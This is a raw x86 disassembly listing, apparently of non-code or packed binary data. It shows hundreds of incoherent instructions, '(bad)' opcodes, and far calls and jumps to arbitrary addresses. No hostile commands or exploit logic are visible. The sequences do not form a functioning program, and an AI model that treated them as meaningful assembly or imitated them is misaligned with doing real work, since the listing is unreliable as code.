  41a9e6:	lods   eax,DWORD PTR ds:[esi]
  41a9e7:	(bad)  
  41a9e8:	fwait
  41a9e9:	scas   al,BYTE PTR es:[edi]
  41a9ea:	mov    ah,0xb6
  41a9ec:	cmp    esp,DWORD PTR [edi]
  41a9ee:	adc    bh,BYTE PTR [ecx+0x28b94f16]
  41a9f4:	sahf   
  41a9f5:	arpl   si,sp
  41a9f7:	mov    esi,0x727b6fdf
  41a9fc:	xlat   BYTE PTR ds:[ebx]
  41a9fd:	aaa    
  41a9fe:	jmp    0x41aa46
  41aa00:	mov    ebx,0x53303a90
  41aa05:	cmc    
  41aa06:	sbb    DWORD PTR [edi-0xb553239],eax
  41aa0c:	test   eax,0xf6025c8a
  41aa11:	(bad)  
  41aa12:	rcl    BYTE PTR [esi-0x5c],1
  41aa15:	pushf  
  41aa16:	sar    BYTE PTR [bp+di],1
  41aa19:	jl     0x41a9a2
  41aa1b:	adc    edi,esi
  41aa1d:	mov    ah,BYTE PTR [edx-0x21]
  41aa20:	les    ebp,FWORD PTR ds:0x4d07211b
  41aa26:	inc    edi
  41aa27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa28:	xor    DWORD PTR [ebp+0x68],edx
  41aa2b:	repz mov dh,0x37
  41aa2e:	sar    BYTE PTR [edi],1
  41aa30:	das    
  41aa31:	lods   eax,DWORD PTR ds:[esi]
  41aa32:	cmp    BYTE PTR fs:0x0,ah
	...
  41aa95:	add    bh,dh
  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x9f8ae277,al
  41aaa4:	lods   al,BYTE PTR ds:[esi]
  41aaa5:	in     eax,0xe5
  41aaa7:	sbb    BYTE PTR [ecx],al
  41aaa9:	add    BYTE PTR [edi],al
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    BYTE PTR [ebx-0x49624dc1],bh
  41aab3:	mov    ebp,DWORD PTR ds:0x3a257078
  41aab9:	cmp    esi,0x8762006f
  41aabf:	mov    dl,0x3a
  41aac1:	jg     0x41aac8
  41aac3:	sahf   
  41aac4:	sbb    esp,DWORD PTR [edx-0x522b4526]
  41aaca:	or     BYTE PTR [eax-0x79f7822b],bh
  41aad0:	call   0x5ead:0xdb22e8a5
  41aad7:	idiv   cl
  41aad9:	add    esi,DWORD PTR [ebp+0x1c]
  41aadc:	movsx  esi,sp
  41aadf:	das    
  41aae0:	inc    ecx
  41aae1:	js     0x41aac4
  41aae3:	add    cl,BYTE PTR [ebx+ebx*8+0x16d44ef8]
  41aaea:	xchg   BYTE PTR [edi+0x70],dh
  41aaed:	and    eax,0x4776d15b
  41aaf2:	inc    ebp
  41aaf3:	mov    edx,0xa978c518
  41aaf8:	in     eax,0xc6
  41aafa:	ret    0x981b
  41aafd:	xchg   esp,eax
  41aafe:	in     eax,0x15
  41ab00:	push   ds
  41ab01:	jmp    0x41ab81
  41ab03:	in     eax,dx
  41ab04:	call   0xbdad:0xd72b72bc
  41ab0b:	daa    
  41ab0c:	jae    0x41aafb
  41ab0e:	xor    eax,0x44113e39
  41ab13:	pushf  
  41ab14:	add    BYTE PTR [esi-0x422d2025],0xdc
  41ab1b:	or     esi,esi
  41ab1d:	sub    BYTE PTR [edx],0x55
  41ab20:	add    eax,0x9f904209
  41ab25:	or     dl,BYTE PTR [ecx]
  41ab27:	sub    al,0x90
  41ab29:	enter  0xd435,0xeb
  41ab2d:	pop    edx
  41ab2e:	les    edx,FWORD PTR [eax]
  41ab30:	stos   DWORD PTR es:[edi],eax
  41ab31:	fild   WORD PTR [ebx]
  41ab33:	add    eax,0xf719649
  41ab38:	add    DWORD PTR [ebx-0x55],ebx
  41ab3b:	into   
  41ab3c:	popf   
  41ab3d:	sub    edi,ebp
  41ab3f:	sub    BYTE PTR [edx+0x4bbcaa08],bh
  41ab45:	xchg   DWORD PTR [edi-0x14157958],ecx
  41ab4b:	cmc    
  41ab4c:	lahf   
  41ab4d:	push   eax
  41ab4e:	and    al,0x51
  41ab50:	and    eax,edi
  41ab52:	pushf  
  41ab53:	xchg   esi,eax
  41ab54:	or     al,0x78
  41ab56:	inc    ecx
  41ab57:	sub    esp,edi
  41ab59:	cli    
  41ab5a:	adc    edi,DWORD PTR [esi+0x71]
  41ab5d:	sub    bl,BYTE PTR [ebp-0x3200fb7]
  41ab63:	(bad)  
  41ab64:	stos   BYTE PTR es:[edi],al
  41ab65:	call   0xd9fe:0xd57eed6
  41ab6c:	dec    esp
  41ab6d:	addr16 jge 0x41ab87
  41ab70:	mov    al,ss:0xdb935aa6
  41ab76:	clc    
  41ab77:	mov    ds:0xd26e7673,eax
  41ab7c:	push   ebx
  41ab7d:	xor    BYTE PTR [ebx-0x413ee4f8],ah
  41ab83:	repnz aaa 
  41ab85:	es push ds
  41ab87:	lahf   
  41ab88:	ins    BYTE PTR es:[edi],dx
  41ab89:	mov    ebx,edx
  41ab8b:	sbb    ebp,edi
  41ab8d:	jb     0x41ab54
  41ab8f:	out    dx,eax
  41ab90:	push   ebx
  41ab91:	(bad)  
  41ab92:	mov    esp,0x74b62c05
  41ab97:	push   esi
  41ab98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab99:	mov    WORD PTR [eax],fs
  41ab9b:	or     eax,0x27331026
  41aba0:	inc    eax
  41aba1:	jno    0x41ab54
  41aba3:	mov    dh,0x89
  41aba5:	mov    dl,0x59
  41aba7:	push   ecx
  41aba8:	daa    
  41aba9:	xchg   ax,ax
  41abab:	addr16 clc 
  41abad:	aam    0xda
  41abaf:	call   0x8e5233d
  41abb4:	and    eax,DWORD PTR [eax]
	...
  41ac16:	push   0x49
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0xacd6cc53
  41ac24:	call   0x700:0x119ecc6
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR [esi],dh
  41ac2f:	lahf   
  41ac30:	pop    ss
  41ac31:	lods   eax,DWORD PTR ds:[esi]
  41ac32:	daa    
  41ac33:	dec    eax
  41ac34:	out    dx,eax
  41ac35:	(bad)  
  41ac36:	adc    ecx,DWORD PTR [ecx+0x27]
  41ac39:	xchg   edx,eax
  41ac3a:	cld    
  41ac3b:	test   eax,0xeed3a124
  41ac40:	mov    dh,0xea
  41ac42:	add    eax,DWORD PTR [ebp+esi*4+0x9]
  41ac46:	cmc    
  41ac47:	test   eax,0x1971d1b
  41ac4c:	dec    ebp
  41ac4d:	push   0xfffffff5
  41ac4f:	cmc    
  41ac50:	loope  0x41abe2
  41ac52:	(bad)  
  41ac53:	jge    0x41ac5b
  41ac55:	jbe    0x41ac61
  41ac57:	and    al,0x20
  41ac59:	mov    ch,dh
  41ac5b:	stos   BYTE PTR es:[edi],al
  41ac5c:	xchg   edx,eax
  41ac5d:	repnz mov al,0xd6
  41ac60:	or     bl,ch
  41ac62:	fdiv   DWORD PTR [edx]
  41ac64:	adc    al,0x67
  41ac66:	aaa    
  41ac67:	sbb    bl,BYTE PTR [eax+0x1b]
  41ac6a:	dec    edx
  41ac6b:	inc    ebp
  41ac6c:	inc    esi
  41ac6d:	jno    0x41accd
  41ac6f:	dec    BYTE PTR [edi+0x24]
  41ac72:	push   edi
  41ac73:	adc    bx,WORD PTR [eax+eax*8]
  41ac77:	xchg   ecx,eax
  41ac78:	mov    ds:0x59219a0b,eax
  41ac7d:	jge    0x41ac15
  41ac7f:	mov    esp,0x85ac11fe
  41ac84:	xor    ebp,DWORD PTR [esi+0x4c]
  41ac87:	mov    dl,0x15
  41ac89:	cmp    eax,0xcb688bd5
  41ac8e:	mov    ah,0x4
  41ac90:	dec    edx
  41ac91:	test   eax,0xdfc87a8
  41ac96:	or     ebp,DWORD PTR [ebx]
  41ac98:	inc    edx
  41ac99:	push   0xffffffd0
  41ac9b:	push   esi
  41ac9c:	pop    ebx
  41ac9d:	mov    edi,0x7700a5f5
  41aca2:	add    bh,BYTE PTR [edx+esi*4]
  41aca5:	push   esp
  41aca6:	cdq    
  41aca7:	stc    
  41aca8:	dec    edx
  41aca9:	add    al,0x79
  41acab:	inc    esp
  41acac:	div    DWORD PTR [esi]
  41acae:	mov    edi,0x196ea740
  41acb3:	pop    ebp
  41acb4:	xor    DWORD PTR [ebp+0x10],0xf
  41acb8:	and    eax,0xb893b585
  41acbd:	cmc    
  41acbe:	imul   ecx,DWORD PTR [ebx-0x5f],0x60ad0faf
  41acc5:	cli    
  41acc6:	sub    al,0x67
  41acc8:	mov    dh,cl
  41acca:	mov    cs,WORD PTR [ecx+0x7b452c17]
  41acd0:	in     eax,0xf2
  41acd2:	pop    ebx
  41acd3:	cmp    ecx,esi
  41acd5:	dec    esp
  41acd6:	dec    ebx
  41acd7:	mov    WORD PTR [eax-0x11],cs
  41acda:	ror    DWORD PTR [edx+0x63],cl
  41acdd:	xchg   esp,eax
  41acde:	mov    ecx,DWORD PTR [eax]
  41ace0:	dec    esi
  41ace1:	mov    ah,0x71
  41ace3:	sbb    esi,edi
  41ace5:	xor    ecx,DWORD PTR [ebp-0x64]
  41ace8:	call   0x783c02a8
  41aced:	inc    ecx
  41acee:	mov    ds:0xfee8511e,al
  41acf3:	scas   eax,DWORD PTR es:[edi]
  41acf4:	sub    BYTE PTR [esp+eax*1-0x7d],dh
  41acf8:	xlat   BYTE PTR ds:[ebx]
  41acf9:	mov    al,0x44
  41acfb:	or     al,0x6b
  41acfd:	mov    ds:0x4df88f56,al
  41ad02:	lods   eax,DWORD PTR ds:[esi]
  41ad03:	pusha  
  41ad04:	cdq    
  41ad05:	jbe    0x41ad01
  41ad07:	ja     0x41acaa
  41ad09:	adc    BYTE PTR [esi-0x23d3fa17],dh
  41ad0f:	pop    ss
  41ad10:	mov    ch,0x18
  41ad12:	fwait
  41ad13:	into   
  41ad14:	dec    ebx
  41ad15:	push   esp
  41ad16:	inc    eax
  41ad17:	sub    DWORD PTR [edx+0x18],ecx
  41ad1a:	dec    ebx
  41ad1b:	xchg   esp,eax
  41ad1c:	out    0x22,eax
  41ad1e:	fsubr  st,st(6)
  41ad20:	mov    ah,0x5e
  41ad22:	in     al,dx
  41ad23:	iret   
  41ad24:	xchg   esi,eax
  41ad25:	sbb    al,0xd3
  41ad27:	adc    cl,BYTE PTR [edx+0x426cf214]
  41ad2d:	mov    edi,0xfdc0638c
  41ad32:	cld    
  41ad33:	shl    edx,1
	...
  41ad95:	add    BYTE PTR [ebp-0x8],dl
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    edi,edx
  41ada3:	stos   DWORD PTR es:[edi],eax
  41ada4:	cmp    al,0x4c
  41ada6:	repz sbb al,BYTE PTR [ecx]
  41ada9:	add    BYTE PTR [edi],al
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR [edi-0x3d],ch
  41adb0:	gs ja  0x41ade9
  41adb3:	les    ebp,FWORD PTR [esi+0x41]
  41adb6:	mov    ds:0xa503c254,eax
  41adbb:	ret    
  41adbc:	sub    eax,DWORD PTR [edx+ebx*4]
  41adbf:	jo     0x41ae2d
  41adc1:	or     ecx,0xffffffd6
  41adc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adc5:	hlt    
  41adc6:	mov    al,0x7f
  41adc8:	sti    
  41adc9:	sbb    al,0xb5
  41adcb:	(bad)  
  41adcc:	pop    ebx
  41adcd:	pop    ebp
  41adce:	outs   dx,BYTE PTR ds:[esi]
  41adcf:	cmp    DWORD PTR ds:0x1f5d25c9,eax
  41add5:	bnd jmpw 0x2b9c
  41adda:	fdivr  st,st(0)
  41addc:	sub    edi,DWORD PTR [edx-0x5]
  41addf:	stos   DWORD PTR es:[edi],eax
  41ade0:	mov    edx,0xa9ea394f
  41ade5:	cs scas eax,DWORD PTR es:[edi]
  41ade7:	cmp    eax,0x1988a87d
  41adec:	adc    eax,0xce622b91
  41adf1:	test   al,0xa2
  41adf3:	xchg   esp,eax
  41adf4:	stos   BYTE PTR es:[edi],al
  41adf5:	into   
  41adf6:	dec    ecx
  41adf7:	sbb    al,0xc9
  41adf9:	nop
  41adfa:	ret    
  41adfb:	jle    0x41ad94
  41adfd:	add    ebp,DWORD PTR [ebx]
  41adff:	add    BYTE PTR [eax+0x75],bh
  41ae02:	xor    al,0xb0
  41ae04:	mov    esp,0xf0e19f4f
  41ae09:	cmp    DWORD PTR [eax],ebp
  41ae0b:	rcr    BYTE PTR [edx-0x2b56269b],0x7f
  41ae12:	xchg   ebx,eax
  41ae13:	pop    ebx
  41ae14:	xchg   ecx,eax
  41ae15:	out    dx,eax
  41ae16:	int3   
  41ae17:	fadd   DWORD PTR [eax+0x476dc04]
  41ae1d:	repz jnp 0x41adcd
  41ae20:	adc    esi,ebx
  41ae22:	fcom   st(7)
  41ae24:	into   
  41ae25:	xor    eax,0xb53cba62
  41ae2a:	xor    BYTE PTR [edi+edx*2],ch
  41ae2d:	out    0xc9,al
  41ae2f:	loope  0x41ae39
  41ae31:	das    
  41ae32:	sub    al,ah
  41ae34:	bound  esi,QWORD PTR [edx+0x680a4a00]
  41ae3a:	jl     0x41ae35
  41ae3c:	loop   0x41ae26
  41ae3e:	loop   0x41ae36
  41ae40:	cmp    ah,BYTE PTR [eax]
  41ae42:	cmp    DWORD PTR [ebx],ecx
  41ae44:	cmp    eax,0x604eeb7b
  41ae49:	loopne 0x41aea6
  41ae4b:	jp     0x41ae32
  41ae4d:	sbb    al,bh
  41ae4f:	leave  
  41ae50:	sub    BYTE PTR [ebp-0x71],dh
  41ae53:	test   BYTE PTR [ecx],al
  41ae55:	xchg   esp,eax
  41ae56:	push   ds
  41ae57:	xchg   edx,eax
  41ae58:	pop    ecx
  41ae59:	jb     0x41ae03
  41ae5b:	dec    edx
  41ae5c:	inc    ecx
  41ae5d:	daa    
  41ae5e:	inc    eax
  41ae5f:	xchg   ebp,eax
  41ae60:	sub    eax,0xab9f9130
  41ae65:	jp     0x41ae3b
  41ae67:	inc    edi
  41ae68:	mov    ds:0xde3995c1,al
  41ae6d:	dec    eax
  41ae6e:	mov    ch,0x16
  41ae70:	sar    bl,0xfb
  41ae73:	xchg   DWORD PTR [ebp+0x492b965c],eax
  41ae79:	mov    ah,0x39
  41ae7b:	push   edi
  41ae7c:	shl    BYTE PTR ss:[ecx+edi*4],0x2f
  41ae81:	fiadd  WORD PTR [esi]
  41ae83:	jmp    0x41ae7a
  41ae85:	inc    ecx
  41ae86:	add    BYTE PTR [ecx],0x5
  41ae89:	repnz mov edi,0xe06d2e5b
  41ae8f:	in     eax,0xe4
  41ae91:	scas   al,BYTE PTR es:[edi]
  41ae92:	leave  
  41ae93:	sub    esi,DWORD PTR [esi-0x2]
  41ae96:	push   0xe4c8a97e
  41ae9b:	xor    al,cl
  41ae9d:	loope  0x41aebd
  41ae9f:	xor    eax,0x82c1a92f
  41aea4:	pop    ds
  41aea5:	push   edx
  41aea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aea7:	cs pop esp
  41aea9:	jae    0x41aee9
  41aeab:	adc    ah,cl
  41aead:	loope  0x41af2a
  41aeaf:	in     eax,0x80
  41aeb1:	out    dx,al
  41aeb2:	inc    ebx
  41aeb3:	xchg   edi,eax
  41aeb4:	cmp    al,0x0
	...
  41af16:	(bad)  
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af67
  41af23:	add    ebp,esp
  41af25:	(bad)  
  41af27:	sbb    eax,DWORD PTR [ecx]
  41af29:	add    BYTE PTR [edi],al
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    BYTE PTR [ebx-0x17],ch
  41af30:	in     eax,dx
  41af31:	int3   
  41af32:	pop    ds
  41af33:	jno    0x41af6e
  41af35:	and    cl,BYTE PTR [esp+ecx*8-0x26477b2d]
  41af3c:	enter  0xdb33,0xd5
  41af40:	in     eax,dx
  41af41:	cli    
  41af42:	cmp    edx,0xffffffec
  41af45:	pop    eax
  41af46:	jne    0x41af2b
  41af48:	jns    0x41aef4
  41af4a:	ret    
  41af4b:	loopne 0x41af0f
  41af4d:	in     eax,0x18
  41af4f:	sub    al,0x59
  41af51:	xchg   BYTE PTR [ebx+0x3b5594f],ch
  41af57:	mov    cl,0xd
  41af59:	lahf   
  41af5a:	add    al,0xbe
  41af5c:	sub    edi,DWORD PTR [edx-0x50bd4417]
  41af62:	xor    eax,0xe58fc917
  41af67:	ss int3 
  41af69:	xchg   BYTE PTR [eax],dh
  41af6b:	inc    esi
  41af6c:	iret   
  41af6d:	das    
  41af6e:	and    ecx,esp
  41af70:	loope  0x41afab
  41af72:	push   ss
  41af73:	fld    TBYTE PTR [ecx]
  41af75:	pop    edx
  41af76:	pop    ebx
  41af77:	mov    BYTE PTR [esi+0x618f9313],0xd0
  41af7e:	or     edx,DWORD PTR [ebx+eiz*2+0x3bb4e501]
  41af85:	daa    
  41af86:	jp     0x41af65
  41af88:	fs cmp cl,ch
  41af8b:	test   DWORD PTR [edx-0x4b976748],edi
  41af91:	addr16 out dx,al
  41af93:	stos   BYTE PTR es:[edi],al
  41af94:	outs   dx,DWORD PTR ds:[esi]
  41af95:	jp     0x41af37
  41af97:	int3   
  41af98:	add    al,0x27
  41af9a:	push   esp
  41af9b:	arpl   si,dx
  41af9d:	jp     0x41af87
  41af9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afa0:	rol    DWORD PTR [edi],1
  41afa2:	push   ecx
  41afa3:	pop    edx
  41afa4:	sti    
  41afa5:	mov    ch,0x9c
  41afa7:	and    al,0xe3
  41afa9:	maxps  xmm2,XMMWORD PTR [eax-0xd]
  41afad:	adc    edi,DWORD PTR [esi]
  41afaf:	mov    eax,ds:0x1d7636c5
  41afb4:	jnp    0x41afde
  41afb6:	das    
  41afb7:	sahf   
  41afb8:	or     al,ah
  41afba:	es xor eax,0x9703f73d
  41afc0:	mov    eax,ds:0x9b8a2c6d
  41afc5:	sub    ah,BYTE PTR [eax-0x53712320]
  41afcb:	cli    
  41afcc:	iret   
  41afcd:	test   BYTE PTR [edi+esi*2],al
  41afd0:	or     edi,DWORD PTR [ebx-0x17]
  41afd3:	adc    bh,BYTE PTR [esi]
  41afd5:	cmp    ch,BYTE PTR [edx]
  41afd7:	xchg   ecx,eax
  41afd8:	adc    ch,BYTE PTR [edi-0x30]
  41afdb:	cmp    eax,DWORD PTR [edx]
  41afdd:	sbb    ch,BYTE PTR [eax+ecx*2-0x1dda1df8]
  41afe4:	sub    ebx,DWORD PTR [esi-0x774124aa]
  41afea:	xchg   BYTE PTR [ebx-0xff86f67],bh
  41aff0:	bound  ebx,QWORD PTR [ebp+0x4fec437e]
  41aff6:	mov    al,0x8d
  41aff8:	je     0x41b069
  41affa:	jae    0x41b05d
  41affc:	outs   dx,BYTE PTR ds:[esi]
  41affd:	add    dl,BYTE PTR [eax+0x74]
  41b000:	xchg   ebp,eax
  41b001:	stos   BYTE PTR es:[edi],al
  41b002:	sbb    ah,ch
  41b004:	sbb    al,BYTE PTR [edi]
  41b006:	ins    DWORD PTR es:[edi],dx
  41b007:	jmp    0x2890:0x901fc4cb
  41b00e:	mov    edi,0x72827251
  41b013:	in     eax,0xd0
  41b015:	push   es
  41b016:	and    eax,0x422472d4
  41b01b:	jo     0x41b073
  41b01d:	test   BYTE PTR [esi],0x91
  41b020:	lock std 
  41b022:	pop    ecx
  41b023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b024:	push   0xebc2cc44
  41b029:	(bad)  
  41b02a:	cwde   
  41b02b:	pop    es
  41b02c:	or     ah,BYTE PTR [ecx-0x28a82627]
  41b032:	mov    esi,0x39ac
	...
  41b093:	add    BYTE PTR [eax],al
  41b095:	add    dh,al
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi+0x5c612531]
  41b0a5:	in     eax,0x1
  41b0a7:	sbb    eax,0x1070001
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	jb     0x41b09e
  41b0b0:	or     DWORD PTR [ecx],ebx
  41b0b2:	cmc    
  41b0b3:	popa   
  41b0b4:	mov    dl,0x82
  41b0b6:	fdivp  st(3),st
  41b0b8:	sub    DWORD PTR [eax-0x41],edx
  41b0bb:	iret   
  41b0bc:	or     edi,ecx
  41b0be:	das    
  41b0bf:	lods   al,BYTE PTR ds:[esi]
  41b0c0:	test   al,0xf1
  41b0c2:	xor    ebx,DWORD PTR [edi]
  41b0c4:	arpl   WORD PTR [edx+0x68],ax
  41b0c7:	or     al,0xbf
  41b0c9:	idiv   DWORD PTR es:[ebx+eax*2+0x7decacd8]
  41b0d1:	pusha  
  41b0d2:	inc    esp
  41b0d3:	adc    DWORD PTR [ebx],eax
  41b0d5:	xchg   ebx,eax
  41b0d6:	dec    ebx
  41b0d7:	scas   al,BYTE PTR es:[edi]
  41b0d8:	adc    al,0x1e
  41b0da:	enter  0xf393,0x56
  41b0de:	lock or DWORD PTR ds:0x1f1421,ebx
  41b0e5:	test   al,0x9e
  41b0e7:	xchg   ebx,eax
  41b0e8:	icebp  
  41b0e9:	mov    al,ds:0x264acdac
  41b0ee:	rep lods al,BYTE PTR ds:[esi]
  41b0f0:	aas    
  41b0f1:	mov    cl,0x73
  41b0f3:	or     BYTE PTR [ebp-0x27707185],0x5a
  41b0fa:	push   ebp
  41b0fb:	fdivr  st(5),st
  41b0fd:	xchg   DWORD PTR [eax-0x53],esi
  41b100:	sub    al,0x72
  41b102:	pop    ss
  41b103:	in     al,0x9a
  41b105:	or     eax,0x332160d0
  41b10a:	sub    ecx,ebx
  41b10c:	std    
  41b10d:	aam    0xb2
  41b10f:	lods   eax,DWORD PTR ds:[esi]
  41b110:	out    0xf,al
  41b112:	pop    ecx
  41b113:	loop   0x41b0da
  41b115:	lahf   
  41b116:	imul   esp,edi,0x934e28da
  41b11c:	data16 ficom WORD PTR [esi]
  41b11f:	test   ah,0xac
  41b122:	arpl   di,di
  41b124:	or     al,0x3b
  41b126:	lea    ebp,[eax]
  41b128:	fimul  WORD PTR [ebp-0x9]
  41b12b:	dec    ebx
  41b12c:	jmp    0x41b103
  41b12e:	mov    eax,0x18219c2f
  41b133:	mov    eax,ds:0x21067fe5
  41b138:	into   
  41b139:	in     al,dx
  41b13a:	shr    BYTE PTR [edi+0x20],0x88
  41b13e:	mov    ds:0xfa5fcccc,al
  41b143:	cld    
  41b144:	push   ecx
  41b145:	and    bl,BYTE PTR ds:0xd110e5db
  41b14b:	and    ecx,ebx
  41b14d:	add    DWORD PTR [edi+0x7c],0x3d
  41b151:	jbe    0x41b1c6
  41b153:	inc    edx
  41b154:	sub    BYTE PTR [ebx],cl
  41b156:	shl    DWORD PTR [edi-0x5576039f],1
  41b15c:	nop
  41b15d:	nop
  41b15e:	cli    
  41b15f:	xchg   ebp,eax
  41b160:	adc    bl,BYTE PTR [edx+0x4887137e]
  41b166:	in     eax,0x2f
  41b168:	ret    0x699f
  41b16b:	js     0x41b17a
  41b16d:	addr16 in eax,dx
  41b16f:	dec    eax
  41b170:	adc    ecx,DWORD PTR [ebp-0x372a8c00]
  41b176:	sti    
  41b177:	(bad)  
  41b179:	or     al,0x83
  41b17b:	icebp  
  41b17c:	push   esi
  41b17d:	ins    BYTE PTR es:[edi],dx
  41b17e:	div    eax
  41b180:	fisttp WORD PTR [ebp-0x219f0d05]
  41b186:	mov    ds:0xbb3d820d,al
  41b18b:	ror    DWORD PTR [edx+0x30],cl
  41b18e:	aas    
  41b18f:	jne    0x41b201
  41b191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b192:	push   eax
  41b193:	aaa    
  41b194:	cmp    BYTE PTR [esi-0x132cab97],al
  41b19a:	addr16 pop ecx
  41b19c:	stos   BYTE PTR es:[edi],al
  41b19d:	and    eax,0xa3acd577
  41b1a2:	retf   
  41b1a3:	mov    esp,DWORD PTR [edx-0xd]
  41b1a6:	mov    edx,0xdce42668
  41b1ab:	cmp    ch,BYTE PTR [ebp+eax*1-0x69]
  41b1af:	xor    al,0xcc
  41b1b1:	std    
  41b1b2:	sti    
  41b1b3:	enter  0xd5,0x0
	...
  41b213:	add    BYTE PTR [eax],al
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	mov    bl,0xf5
  41b224:	outs   dx,BYTE PTR ds:[esi]
  41b225:	or     BYTE PTR [eax],cl
  41b227:	push   ds
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR ds:0xae02729,cl
  41b233:	cmp    BYTE PTR [ebp-0x4b9524b4],dl
  41b239:	or     eax,0xe92c5c5d
  41b23e:	xor    BYTE PTR [ecx],al
  41b240:	cmp    dh,BYTE PTR [ebp-0x28]
  41b243:	enter  0x404b,0xa4
  41b247:	xchg   esp,eax
  41b248:	mov    bl,0xcf
  41b24a:	or     DWORD PTR [edx-0x66],eax
  41b24d:	mov    BYTE PTR [ebx+0x3a],bl
  41b250:	ds (bad) 
  41b253:	pop    eax
  41b254:	xchg   edx,eax
  41b255:	xor    dl,BYTE PTR [edi]
  41b257:	pop    ss
  41b258:	cmp    BYTE PTR ds:0x304c426e,dh
  41b25e:	fwait
  41b25f:	adc    DWORD PTR [edi],0x66
  41b262:	sbb    BYTE PTR [edi+0x5330dd53],ch
  41b268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b269:	in     eax,0xfb
  41b26b:	neg    BYTE PTR [ecx]
  41b26d:	aas    
  41b26e:	jne    0x41b24e
  41b270:	sub    al,0xf4
  41b272:	mov    bh,0x2e
  41b274:	jno    0x41b2c7
  41b276:	mov    ecx,eax
  41b278:	jnp    0x41b204
  41b27a:	cmp    DWORD PTR [ecx],edx
  41b27c:	mov    ah,0xae
  41b27e:	outs   dx,BYTE PTR ds:[esi]
  41b27f:	inc    ebx
  41b280:	xor    BYTE PTR [ebp-0x2b],ch
  41b283:	mov    ds:0x7b43c24d,eax
  41b288:	xor    eax,0x71cc4690
  41b28d:	leave  
  41b28e:	cmc    
  41b28f:	lahf   
  41b290:	push   0xffffff82
  41b292:	or     DWORD PTR [edi+0x7e155a19],eax
  41b298:	pop    ecx
  41b299:	pop    edi
  41b29a:	aam    0x94
  41b29c:	cmp    eax,0xe60e9e35
  41b2a1:	lock ficom DWORD PTR [ecx+0x72020e4]
  41b2a8:	dec    ebp
  41b2a9:	inc    ebp
  41b2aa:	repnz push edi
  41b2ac:	(bad)  
  41b2ad:	adc    BYTE PTR [esi],bl
  41b2af:	hlt    
  41b2b0:	mov    esp,0x1dd695f1
  41b2b5:	and    ecx,DWORD PTR [ebx]
  41b2b7:	(bad)  
  41b2b9:	push   0x641e6eee
  41b2be:	jmp    0x41b325
  41b2c0:	xchg   esp,eax
  41b2c1:	sub    esi,DWORD PTR [ebp+0x6a]
  41b2c4:	dec    esi
  41b2c5:	ja     0x41b27b
  41b2c7:	add    al,0xf6
  41b2c9:	push   0x18
  41b2cb:	shl    BYTE PTR [edi-0x31],cl
  41b2ce:	stos   BYTE PTR es:[edi],al
  41b2cf:	bound  ebp,QWORD PTR [ecx]
  41b2d1:	test   al,0x31
  41b2d3:	out    dx,al
  41b2d4:	inc    edi
  41b2d5:	ins    DWORD PTR es:[edi],dx
  41b2d6:	jle    0x41b2f4
  41b2d8:	sbb    cl,BYTE PTR [esi]
  41b2da:	cld    
  41b2db:	das    
  41b2dc:	or     ecx,ebp
  41b2de:	fcmovu st,st(4)
  41b2e0:	xchg   ebx,eax
  41b2e1:	inc    ebx
  41b2e2:	mov    cs,edx
  41b2e4:	pushf  
  41b2e5:	mov    ds:0x656ca669,al
  41b2ea:	cwde   
  41b2eb:	pop    esi
  41b2ec:	rol    DWORD PTR [ebx+edx*8],0x9a
  41b2f0:	adc    al,0x6
  41b2f2:	dec    ebp
  41b2f3:	sub    edx,DWORD PTR [esi+0x4f20f9ff]
  41b2f9:	cmc    
  41b2fa:	rcl    ebp,1
  41b2fc:	xchg   esp,eax
  41b2fd:	fwait
  41b2fe:	icebp  
  41b2ff:	jmp    0x41b2ae
  41b301:	scas   eax,DWORD PTR es:[edi]
  41b302:	icebp  
  41b303:	lea    ebp,[ebp-0x27]
  41b306:	sbb    BYTE PTR [eax],ah
  41b308:	jo     0x41b31d
  41b30a:	(bad)  
  41b30c:	rcl    DWORD PTR [ebp-0x3a],cl
  41b30f:	pop    esi
  41b310:	mov    esi,0x57b46d29
  41b315:	jp     0x41b389
  41b317:	test   edx,edx
  41b319:	mov    dl,0xc6
  41b31b:	faddp  st(6),st
  41b31d:	and    eax,0x1be2b039
  41b322:	jnp    0x41b310
  41b324:	enter  0xf7b7,0xbd
  41b328:	test   BYTE PTR [esi+ebp*2+0x2acf9b6b],al
  41b32f:	in     al,dx
  41b330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b331:	bound  eax,QWORD PTR [esp+eiz*8+0xc]
	...
  41b395:	add    BYTE PTR [eax+0xd],cl
  41b398:	sbb    eax,0xfebb5dab
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	out    dx,eax
